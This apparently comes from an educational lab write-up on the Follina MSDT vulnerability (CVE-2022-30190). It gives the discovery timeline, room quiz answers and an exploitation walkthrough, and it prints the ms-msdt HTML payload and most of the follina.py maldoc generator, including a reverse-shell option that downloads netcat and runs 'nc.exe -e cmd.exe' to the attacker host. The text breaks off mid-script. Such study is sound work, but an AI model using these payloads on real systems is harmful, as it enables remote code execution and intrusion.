---
A walkthrough on the CVE-2022-30190, the MSDT service, exploitation of the service vulnerability, and consequent detection techniques and remediation processes
---

# Follina MSDT — Writeup

## Overview
### Follina MSDT — Writeup
### Follina MSDT — Writeup
![|555](https://tryhackme-images.s3.amazonaws.com/room-icons/15270f24a2679e11ec174005425e3ba5.jpeg)
### Introduction
Microsoft [explains](https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/) that “a remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights”
Learning Objectives:
In this room, we will explore what the Microsoft Support Diagnostic Tool is and the discovered vulnerability that it has. In the process, we will be able to experience exploiting this vulnerability and consequently learn some techniques to detect and mitigate its exploitation in our own environments
Room Prerequisites and Expectation Setting:
There are no hard prerequisites in order to gain value from this room, however it would be very helpful to have a basic understanding of various scripting tools e.g. Windows CLI, Linux Bash Terminal, and PowerShell. Further, this room will touch upon Windows Processes and Data Correlation in lieu of Threat Hunting, albeit nothing too deep nor too complex to be understood.
### CVE-2022-30190
Microsoft Support Diagnostic Tool which provides the troubleshooting wizard to diagnose Wi-Fi and audio problems
The MSDT exploit is not something new - in fact, a bachelor’s thesis has been published August of 2020 regarding techniques on how to use MSDT for code execution. Almost two years after that initial publication, pieces of evidence of MSDT exploitation as well as code execution via Office URIs has triggered several independent researchers to file separate reports to [MSRC](https://msrc-blog.microsoft.com/), the latter of which has been patched (specifically in Microsoft Teams) whereas the former remained vulnerable
It’s not until the discovery of nao_sec, which has been made public in twitter, that attacks using this particular vector is actively being made in the wild. This is consequently picked up by Kevin Beaumont who publicly identified it as a zero day that Microsoft EDR products are failing to detect, and then later classified by Microsoft as a zero day with the vulnerability name CVE-2022-30190
Summarized timeline of its discovery:
August 1st 2020  — A bachelor thesis is published detailing how to use MSDT to execute code https://benjamin-altpeter.de/doc/thesis-electron.pdf
March 10th 2021  — researchers report to Microsoft how to use Microsoft Office URIs to execute code using Microsoft Teams as an example. Microsoft fail to issue a CVE or inform customers, but stealth patched it in Microsoft Teams in August 2021. They did not patch MSDT in Windows or the vector in Microsoft Office (Link) https://positive.security/blog/ms-officecmd-rce
April 12th 2022  — first report to Microsoft MSRC of exploitation in wild via MSDT, by leader of Shadowchasing1, an APT hunting group. This document is an in the wild, real world exploit targeting Russia, themed as a Russian job interview https://twitter.com/CrazymanArmy/status/1531117401181671430?s=20&t=7xvbwh1HXx2sgPh_ms7IzA
Microsoft Security Response Center
April 21st 2022  — Microsoft MSRC closed the ticket saying not a security related issue (for the record, msdt executing with macros disabled is an issue)
May 27th 2022  — Security vendor Nao tweet a document uploaded from Belarus, which is also an in the wild attack.
May 29th 2022  — Kevin Beaumont identified this was a zero day publicly as it still works against Office 365 Semi Annual channel, and ‘on prem’ Office versions and EDR products are failing to detect
May 31st 2022  — Microsoft classify this a zero day in Microsoft Defender Vulnerability Management
https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/behavior
June 14th 2022  — a fix for this vulnerability, CVE-2022–30190, is available in June 2022’s Patch Tuesday https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190
Further readings:
Follina — a Microsoft Office code execution vulnerability | by Kevin Beaumont | May, 2022 | DoublePulsar
https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e
Full timeline, early details regarding the vulnerability, and “Follina” namesake courtesy of Kevin Beaumont
Rapid Response: Microsoft Office RCE - “Follina” MSDT Attack (huntress.com)
https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug
What year was MSDT first discovered to be vulnerable to code execution?
*2020*
Who is the author of the bachelor's thesis which first detailed this vulnerability?
*Benjamin Altpeter*
What is the name of the APT hunting group who first reported evidence of exploitation in the wild of MSDT to MSRC?
*Shadowchasing1*
### The MSDT Service
[Microsoft](https://docs.microsoft.com/en-us/troubleshoot/sql/general/answers-questions-msdt) states that “the Microsoft Support Diagnostic Tool (MSDT) collects information to send to Microsoft Support. They will then analyze this information and use it to determine the resolution to any problems that you may be experiencing on your computer”
With that in mind, it’s essentially a way for Microsoft Support to immediately see what’s wrong as they’re getting all the information they need straight from the source
Think of it like this - you’re having car problems and you don’t know about cars at all. You call your trusty car mechanic, but instead of him asking you to check different parts of the car while he tries to deduce what’s wrong with it remotely, he just gives you a passkey, instructs you how to use it and the car will magically produce a report that you can then send to the mechanic. Quick, easy, and efficient.
Further reading: Windows 10 CTP: How To Run Microsoft Support Diagnostic Tool - TechNet Articles - United States (English) - TechNet Wiki
https://social.technet.microsoft.com/wiki/contents/articles/30458.windows-10-ctp-how-to-run-microsoft-support-diagnostic-tool.aspx
What's one thing you need that the support will provide you when you're using the MSDT legitimately?
*passkey*

## Exploitation
Click the Start Machine button on this task before continuing. The machine will be available on your web browser, in split-screen view.
Before we do any exploitation in the machine, let’s first try and make sense of the baseline processes of the machine. It is in having a sense of normalcy that we’d be able to spot minute changes later on that may consequently reveal malicious activity by a threat actor in our environment.
The [process explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) from sysinternals has already been downloaded and pinned in the taskbar for easier access. Proceed to open it and scan through the processes currently running in the machine. Keep it open as we go through the activities later on so you'd be able to immediately see how an exploited follina-msdt vulnerability would look like as compared to the "baseline" - the processes that we're seeing while the machine is immaculate.
Exploit Explanation
Let’s start with a disclaimer: for our purposes, we’ll be loading our payload via a word document, particularly in the .docx format - this is the original exploit that has been [discovered in the wild](https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/detection). However, this vulnerability has been proved to work in a number of other office products, and the student is obliged to maximize learning by trying them out separately.
Two important aspects of this vulnerability are: 1) specific docx files contain OLE (originally abbreviates to Object Linking and Embedding) Object references, and sometimes, they take the form of HTML files hosted elsewhere, and 2) MS-MSDT allows for code execution.
Combining the above two aspects together, an MS-MSDT HTML scheme can be used to execute PowerShell code, and that a docx file can be used to load it via word’s external reference capability.
More specifically, drilling into the docx structure, the word/_rels/document.xml.rels file has an XML tag <Relationship> with an attribute Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" that describes an external oleObject reference. In order to exploit this docx feature, we can edit the contents of this tag to point instead to the payload that we're hosting by changing the Target value into http://<external_payload_server.com>/<payload.html> and the TargetMode value into "External".
In the word/document.xml file, there's an XML tag that starts with <o:OLEObject...> wherein we should change the Type value to "Link" and then add the Key-Value pair attribute UpdateMode="OnCall".
The only thing left to do now is to host the payload that the word file will be connecting to, and receiving instructions from upon opening of the file. This is done by creating an html file with a structure similar to this:
```text
<!doctype html>

<html lang="en">

<body>

<script>

//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated >60 times

  window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"";

</script>

</body>

</html>
```
In the above contents of the html file, you'd notice the ms-msdt:/id PCWDiagnostic /skip force /param command, along with the command switches you can use to set the command you want to execute in the target machine. You can then mix and match the payload according to your purposes.
As such, we now have a way to achieve remote code execution without touching any macros, and as we'll see later, without even opening the malicious document.
Publicly Available Exploit Focus: [JohnHammond/msdt-follina](https://github.com/JohnHammond/msdt-follina)
John Hammond has created a tool to automate the process of creating a malicious document (maldoc) and consequently host the malicious html file that houses the bad command. The tool is documented in the link above, and we will be using a forked version of it to further understand the concept of the exploit touched upon earlier.
To start with our experiment, open a terminal instance in your Attackbox and enter the following command:
```text
msdt-follina

           
root@attackbox:~# cd ~/Rooms/Follina-MSDT
```
We change our working directory to ~/Rooms/Follina-MSDT, where the msdt-follina repository has been cloned for you.
```text
Launch the exploit

           
root@attackbox:~/Rooms/Follina-MSDT# python3.9 follina.py
[+] copied staging doc /tmp/[random string]
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
```
Upon firing up the exploit, you should be hosting the file already, so it’s ready to be “delivered” to the victim machine. Effective delivery mechanisms of malicious payloads are outside the scope of this room, so we’ll just settle for a simpler way of transferring files from linux to windows:
While keeping the original terminal open, open another terminal in your Attackbox and enter the following command:
```text
Simple HTTP Server

           
root@attackbox:~# cd ~/Rooms/Follina-MSDT 
root@attackbox:~/Rooms/Follina-MSDT# python -m http.server 3456
Serving HTTP on 0.0.0.0 port 3456 (http://0.0.0.0:3456/) ...
```
Start the Windows machine and wait for it to initialize. When everything's settled, proceed to open a command prompt and enter the following command:
```text
Maldoc Download

           
Microsoft Windows [Version]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator> cd Desktop
C:\Users\Administrator\Desktop> curl http://[attackbox IP]:3456/follina.doc -o follina.docx
```
This downloads the maldoc in our machine and as such, shortly after, you should be able to see the word file named follina.docx appear in the Desktop, ready to be run. When you're ready, open the file and watch what happens.
For now, let's allow the maldoc and all of the stuff that it spawned, to remain running, while we examine the contents of the process explorer.
Process Explorer
Looking at the process explorer may be daunting as there are a ton of processes always running within the machine. In our case, we haven't done a lot of stuff with it and yet the number of running processes already covers the entire screen. This is where the importance of "making sense of the baseline", discussed in the first part of this task, is emphasized.
If you don't have any established baseline, it's easy to get paranoid and everything will suddenly seem to be suspicious. This is where you start wasting your time checking each and every process there is - mainly because you're unfamiliar with each and every one of them.
Scrolling through the processes, you'll be able to spot WINWORD.EXE immediately, followed by an msdt.exe child process. Somewhere in the list of processes you'll be able to see a process for the calculator as well which is the win32calc.exe. It might look something like this, although it's completely normal if the WINDWORD.EXE and the win32calc.exe are far away from each other.
Now, finding these artifacts are easy because we already know what to look for, but how do we tackle the ones that we don't know about, the so called unknown unknowns? Well, we can refer to the baseline that we have, we compare, and then we validate.
"Zero Click" Implementation
In order to replicate the “zero click” implementation of this vulnerability, we simply head to the malicious word file, add a cute message (completely optional),  save it in the Rich Text Format (RTF), and we’re good to go. This implementation assumes that the victim machine is in the preview pane view, else it will revert to the original functionality which will still run upon opening of the file.
﻿Open the file explorer and navigate to the Desktop folder. There you will see the seemingly honest file that we made that needs clicking, proceed to click it once careful not to actually open it and see what will happen.
Despite not actually opening the file, the exploit ran in the same manner that it did earlier in this exercise. This happened because of two key features: 1) the feature of the File Explorer to preview files before opening them, and 2) the RTF which allows the feature of document files being able to be previewed in the File Explorer before being opened (among other purposes).
Combining the two and then abusing them will result in an attack vector that we’ve just witnessed now.
```text
root@ip-10-10-1-188:~# cd Rooms/Follina-MSDT/
root@ip-10-10-1-188:~/Rooms/Follina-MSDT# ls
doc  follina.py  nc64.exe  README.md
root@ip-10-10-1-188:~/Rooms/Follina-MSDT# cat follina.py 
#!/usr/bin/env python3

import argparse
import zipfile
import tempfile
import shutil
import os
import netifaces
import ipaddress
import random
import base64
import http.server
import socketserver
import string
import socket
import threading

parser = argparse.ArgumentParser()

parser.add_argument(
    "--command",
    "-c",
    default="calc",
    help="command to run on the target (default: calc)",
)

parser.add_argument(
    "--output",
    "-o",
    default="./follina.doc",
    help="output maldoc file (default: ./follina.doc)",
)

parser.add_argument(
    "--interface",
    "-i",
    default="eth0",
    help="network interface or IP address to host the HTTP server (default: eth0)",
)

parser.add_argument(
    "--port",
    "-p",
    type=int,
    default="8000",
    help="port to serve the HTTP server (default: 8000)",
)

parser.add_argument(
    "--reverse",
    "-r",
    type=int,
    default="0",
    help="port to serve reverse shell on",
)

def main(args):
```
```text
# Parse the supplied interface
```
```text
# This is done so the maldoc knows what to reach out to.
    try:
        serve_host = ipaddress.IPv4Address(args.interface)
    except ipaddress.AddressValueError:
        try:
            serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0][
                "addr"
            ]
        except ValueError:
            print(
                "[!] error detering http hosting address. did you provide an interface or ip?"
            )
            exit()
```
```text
# Copy the Microsoft Word skeleton into a temporary staging folder
    doc_suffix = "doc"
    staging_dir = os.path.join(
        tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())
    )
    doc_path = os.path.join(staging_dir, doc_suffix)
    shutil.copytree(doc_suffix, os.path.join(staging_dir, doc_path))
    print(f"[+] copied staging doc {staging_dir}")
```
```text
# Prepare a temporary HTTP server location
    serve_path = os.path.join(staging_dir, "www")
    os.makedirs(serve_path)
```
```text
# Modify the Word skeleton to include our HTTP server
    document_rels_path = os.path.join(
        staging_dir, doc_suffix, "word", "_rels", "document.xml.rels"
    )

    with open(document_rels_path) as filp:
        external_referral = filp.read()

    external_referral = external_referral.replace(
        "{staged_html}", f"http://{serve_host}:{args.port}/index.html"
    )

    with open(document_rels_path, "w") as filp:
        filp.write(external_referral)
```
```text
# Rebuild the original office file
    shutil.make_archive(args.output, "zip", doc_path)
    os.rename(args.output + ".zip", args.output)

    print(f"[+] created maldoc {args.output}")

    command = args.command
    if args.reverse:
        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
```
```text
# Base64 encode our command so whitespace is respected
    base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
```
```text
# Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += (
        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
        + "\n</script>"
    )
```
```text
# Create our HTML endpoint
    with open(os.path.join(serve_path, "index.html"), "w") as filp:
        filp.write(html_payload)

